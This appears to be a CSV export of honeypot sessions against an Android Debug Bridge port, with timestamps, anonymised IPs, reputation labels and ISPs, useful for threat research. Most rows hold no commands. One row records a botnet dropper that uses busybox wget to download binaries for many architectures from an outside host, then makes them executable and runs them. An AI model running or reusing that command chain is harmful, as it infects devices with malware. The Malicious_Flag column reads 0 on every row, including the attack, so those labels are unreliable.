session_id,Anon Src IP,src_port,Dst IP,dest_port,start_time,end_time,duration,sensor,commands,VT Labels,VT Reputation,Geo Location,ISP,Malicious_Flag
11145558b37a,109.161.214.54,32934,172.29.0.2,5555,2025-03-17T18:24:38.930183Z,2025-03-17T18:29:39.058159Z,300.13,honeypot01,,"malicious, malware, phishing",-4,US,"AS14061 DigitalOcean, LLC",0
b4ffac9b5c78,109.161.214.54,50804,172.29.0.2,5555,2025-03-17T18:24:48.925371Z,2025-03-17T18:29:49.107015Z,300.18,honeypot01,,"malicious, malware, phishing",-4,US,"AS14061 DigitalOcean, LLC",0
fc685c6bb9fe,109.161.214.54,55500,172.29.0.2,5555,2025-03-17T18:24:58.927710Z,2025-03-17T18:29:59.111386Z,300.18,honeypot01,,"malicious, malware, phishing",-4,US,"AS14061 DigitalOcean, LLC",0
baebff640292,109.161.214.54,44836,172.29.0.2,5555,2025-03-17T18:25:08.931954Z,2025-03-17T18:30:09.117414Z,300.19,honeypot01,,"malicious, malware, phishing",-4,US,"AS14061 DigitalOcean, LLC",0
64ac8840565e,109.161.214.54,38596,172.29.0.2,5555,2025-03-17T18:25:18.927764Z,2025-03-17T18:30:19.111806Z,300.18,honeypot01,,"malicious, malware, phishing",-4,US,"AS14061 DigitalOcean, LLC",0
a10add2881f7,244.119.37.242,41745,172.25.0.2,5555,2025-03-16T06:19:07.226027Z,2025-03-16T06:24:07.930137Z,300.7,honeypot01,,,0,FR,AS16276 OVH SAS,0
bae7580c6a49,0.71.179.141,53061,172.25.0.2,5555,2025-03-16T10:06:31.868139Z,2025-03-16T10:11:32.016593Z,300.15,honeypot01,,"malicious, malware",-1,US,AS213412 ONYPHE SAS,0
cb947ce5981c,73.112.0.232,52706,172.25.0.2,5555,2025-03-16T12:55:14.426856Z,2025-03-16T13:00:14.555277Z,300.13,honeypot01,,"malicious, malware",-1,CN,AS4134 CHINANET-BACKBONE,0
ebac7953e388,133.94.237.12,5543,172.25.0.2,5555,2025-03-16T13:41:24.893878Z,2025-03-16T13:46:25.026607Z,300.13,honeypot01,,"malicious, malware, phishing",-4,US,AS6939 Hurricane Electric LLC,0
404e92c6b82e,121.187.157.7,43254,172.25.0.2,5555,2025-03-16T15:40:27.853477Z,2025-03-16T15:45:27.938786Z,300.09,honeypot01,,"malicious, malware, phishing",-2,US,"AS14061 DigitalOcean, LLC",0
891f6282494e,121.187.157.7,42016,172.25.0.2,5555,2025-03-16T15:40:39.039001Z,2025-03-16T15:45:39.153280Z,300.11,honeypot01,,"malicious, malware, phishing",-2,US,"AS14061 DigitalOcean, LLC",0
68a98baee665,121.187.157.7,47490,172.25.0.2,5555,2025-03-16T15:40:48.038362Z,2025-03-16T15:45:48.217949Z,300.18,honeypot01,,"malicious, malware, phishing",-2,US,"AS14061 DigitalOcean, LLC",0
0cc192d90065,121.187.157.7,44892,172.25.0.2,5555,2025-03-16T15:40:58.038236Z,2025-03-16T15:45:58.220726Z,300.18,honeypot01,,"malicious, malware, phishing",-2,US,"AS14061 DigitalOcean, LLC",0
05f502b5a3bb,121.187.157.7,34324,172.25.0.2,5555,2025-03-16T15:41:08.038739Z,2025-03-16T15:46:08.218422Z,300.18,honeypot01,,"malicious, malware, phishing",-2,US,"AS14061 DigitalOcean, LLC",0
7d62390fc233,121.187.157.7,38178,172.25.0.2,5555,2025-03-16T15:41:18.039994Z,2025-03-16T15:46:18.215323Z,300.18,honeypot01,,"malicious, malware, phishing",-2,US,"AS14061 DigitalOcean, LLC",0
fec733990a49,99.34.63.240,35982,172.25.0.2,5555,2025-03-16T17:57:07.682022Z,2025-03-16T18:02:07.717734Z,300.04,honeypot01,,,0,NL,AS984 OCTOPUS WEB SOLUTION INC,0
f423bec48c22,5.59.92.13,49766,192.168.32.2,5555,2025-03-15T08:17:34.858315Z,2025-03-15T08:18:20.059265Z,45.2,honeypot01,cd /data/local/tmp/; rm *; busybox wget http://176.65.134.15/arm.nn; chmod +x arm.nn; ./arm.nn arm.android; busybox wget http://176.65.134.15/arm5.nn; chmod +x arm5.nn; ./arm5.nn arm5.android; busybox wget http://176.65.134.15/arm6.nn; chmod +x arm6.nn; ./arm6.nn arm6.android; busybox wget http://176.65.134.15/arm7.nn; chmod +x arm7.nn; ./arm7.nn arm7.android; busybox wget http://176.65.134.15/x86_64.nn; chmod +x x86_64.nn; ./x86_64.nn x86.android; busybox wget http://176.65.134.15/x86_32.nn; chmod +x x86_32.nn; ./x86_32.nn x86.android; busybox wget http://176.65.134.15/m68k.nn; chmod +x m68k.nn; ./m68k.nn m68k.android; busybox wget http://176.65.134.15/mips.nn; chmod +x mips.nn; ./mips.nn mips.android; busybox wget http://176.65.134.15/mipsel.nn; chmod +x mipsel.nn; ./mipsel.nn mipsel.android; busybox wget http://176.65.134.15/powerpc.nn; chmod +x powerpc.nn; ./powerpc.nn powerpc.android; busybox wget http://176.65.134.15/sh4.nn; chmod +x sh4.nn; ./sh4.nn sh4.android; busybox wget http://176.65.134.15/sparc.nn; chmod +x sparc.nn; ./sparc.nn sparc.android,"malicious, phishing, malware",0,NL,AS401120 cheapy.host LLC,0
5df43bbcc3c8,133.94.131.170,36341,192.168.32.2,5555,2025-03-15T08:58:59.711147Z,2025-03-15T09:03:59.884313Z,300.17,honeypot01,,"malicious, malware, phishing",-3,US,AS6939 Hurricane Electric LLC,0
d6a52bfd9fb4,6.251.21.45,65472,192.168.32.2,5555,2025-03-15T09:57:54.136668Z,2025-03-15T10:02:54.291532Z,300.15,honeypot01,,"malicious, phishing, malware",-3,BE,AS396982 Google LLC,0
496a6e800b22,6.251.21.45,59520,192.168.32.2,5555,2025-03-15T09:58:04.093388Z,2025-03-15T10:03:04.104563Z,300.01,honeypot01,,"malicious, phishing, malware",-3,BE,AS396982 Google LLC,0
94549ec55584,132.202.226.122,18050,192.168.32.2,5555,2025-03-15T10:06:13.116882Z,2025-03-15T10:11:13.386660Z,300.27,honeypot01,,"malicious, phishing, malware",34,US,AS6939 Hurricane Electric LLC,0
68cfd57c9e71,240.120.197.114,49604,192.168.32.2,5555,2025-03-15T10:23:27.105699Z,2025-03-15T10:28:27.292767Z,300.19,honeypot01,,,0,US,"AS16509 Amazon.com, Inc.",0
fb811dc604a9,240.120.197.114,49648,192.168.32.2,5555,2025-03-15T10:23:28.770412Z,2025-03-15T10:28:28.960870Z,300.19,honeypot01,,,0,US,"AS16509 Amazon.com, Inc.",0
fde987a01646,240.120.197.114,35380,192.168.32.2,5555,2025-03-15T10:23:32.444699Z,2025-03-15T10:28:32.616051Z,300.17,honeypot01,,,0,US,"AS16509 Amazon.com, Inc.",0
3627dc3394dc,240.120.197.114,35400,192.168.32.2,5555,2025-03-15T10:23:35.048701Z,2025-03-15T10:28:35.225133Z,300.18,honeypot01,,,0,US,"AS16509 Amazon.com, Inc.",0
9ee8956ed0f8,240.120.197.114,35384,192.168.32.2,5555,2025-03-15T10:23:35.687474Z,2025-03-15T10:28:35.846194Z,300.16,honeypot01,,,0,US,"AS16509 Amazon.com, Inc.",0
06889aef00cb,240.120.197.114,60972,192.168.32.2,5555,2025-03-15T10:24:12.312759Z,2025-03-15T10:29:12.484577Z,300.17,honeypot01,,,0,US,"AS16509 Amazon.com, Inc.",0
447c3ee06f2c,69.247.130.18,39668,192.168.32.2,5555,2025-03-15T15:22:24.553381Z,2025-03-15T15:27:24.622893Z,300.07,honeypot01,,"malicious, malware, phishing",-8,NL,AS49870 Alsycon B.V.,0
5ef81463424d,69.247.130.18,39672,192.168.32.2,5555,2025-03-15T15:22:24.559892Z,2025-03-15T15:27:24.621934Z,300.06,honeypot01,,"malicious, malware, phishing",-8,NL,AS49870 Alsycon B.V.,0
a92b684089c6,69.247.130.18,39682,192.168.32.2,5555,2025-03-15T15:22:24.568070Z,2025-03-15T15:27:24.622723Z,300.05,honeypot01,,"malicious, malware, phishing",-8,NL,AS49870 Alsycon B.V.,0
b369c88b8433,240.120.197.114,47286,192.168.32.2,5555,2025-03-15T16:17:36.480172Z,2025-03-15T16:22:36.665663Z,300.19,honeypot01,,,0,US,"AS16509 Amazon.com, Inc.",0
dcb1f0f368a8,240.120.197.114,47294,192.168.32.2,5555,2025-03-15T16:17:37.305732Z,2025-03-15T16:22:37.490643Z,300.18,honeypot01,,,0,US,"AS16509 Amazon.com, Inc.",0
f30708cbf89e,240.120.197.114,47308,192.168.32.2,5555,2025-03-15T16:17:41.703686Z,2025-03-15T16:22:41.874506Z,300.17,honeypot01,,,0,US,"AS16509 Amazon.com, Inc.",0
22a1755ddae6,240.120.197.114,52768,192.168.32.2,5555,2025-03-15T16:17:42.124378Z,2025-03-15T16:22:42.300602Z,300.18,honeypot01,,,0,US,"AS16509 Amazon.com, Inc.",0
bf556590eb3d,240.120.197.114,48260,192.168.32.2,5555,2025-03-15T16:18:09.010835Z,2025-03-15T16:23:09.198954Z,300.19,honeypot01,,,0,US,"AS16509 Amazon.com, Inc.",0
1230166596d3,69.244.67.20,36691,192.168.32.2,5555,2025-03-15T16:55:17.501503Z,2025-03-15T17:00:17.626523Z,300.13,honeypot01,,"malicious, malware",0,US,AS21859 Zenlayer Inc,0
503c7e4d7c8d,91.189.85.14,43010,192.168.32.2,5555,2025-03-15T17:51:45.142362Z,2025-03-15T17:56:45.273202Z,300.13,honeypot01,,"malicious, malware",0,CN,AS135629 Ningxia West Cloud Data Technology Co.Ltd.,0
c7cd034cc289,122.242.240.156,54362,192.168.32.2,5555,2025-03-15T23:44:30.941595Z,2025-03-15T23:49:30.986755Z,300.05,honeypot01,,"malicious, malware, phishing",-1,US,"AS14061 DigitalOcean, LLC",0
758c7362097d,122.242.240.156,47744,192.168.32.2,5555,2025-03-15T23:44:41.060152Z,2025-03-15T23:49:41.213750Z,300.15,honeypot01,,"malicious, malware, phishing",-1,US,"AS14061 DigitalOcean, LLC",0
d3170b0d9370,122.242.240.156,42364,192.168.32.2,5555,2025-03-15T23:44:51.063362Z,2025-03-15T23:49:51.235374Z,300.17,honeypot01,,"malicious, malware, phishing",-1,US,"AS14061 DigitalOcean, LLC",0
a4206f215496,122.242.240.156,56978,192.168.32.2,5555,2025-03-15T23:45:01.067139Z,2025-03-15T23:50:01.237845Z,300.17,honeypot01,,"malicious, malware, phishing",-1,US,"AS14061 DigitalOcean, LLC",0
66190dfd2a56,122.242.240.156,47056,192.168.32.2,5555,2025-03-15T23:45:11.068157Z,2025-03-15T23:50:11.244958Z,300.18,honeypot01,,"malicious, malware, phishing",-1,US,"AS14061 DigitalOcean, LLC",0
bab476d53f8f,122.242.240.156,60922,192.168.32.2,5555,2025-03-15T23:45:21.068746Z,2025-03-15T23:50:21.255752Z,300.19,honeypot01,,"malicious, malware, phishing",-1,US,"AS14061 DigitalOcean, LLC",0
708a8df3dd9e,85.123.249.229,53258,192.168.32.2,5555,2025-03-16T02:55:15.827746Z,2025-03-16T03:00:16.027568Z,300.2,honeypot01,,"malicious, malware, phishing",-1,AU,"AS14061 DigitalOcean, LLC",0
cbb3c8637533,85.123.249.229,50880,192.168.32.2,5555,2025-03-16T02:55:25.859162Z,2025-03-16T03:00:26.024285Z,300.17,honeypot01,,"malicious, malware, phishing",-1,AU,"AS14061 DigitalOcean, LLC",0
3972ab75dea0,85.123.249.229,36882,192.168.32.2,5555,2025-03-16T02:55:35.859917Z,2025-03-16T03:00:36.022172Z,300.16,honeypot01,,"malicious, malware, phishing",-1,AU,"AS14061 DigitalOcean, LLC",0
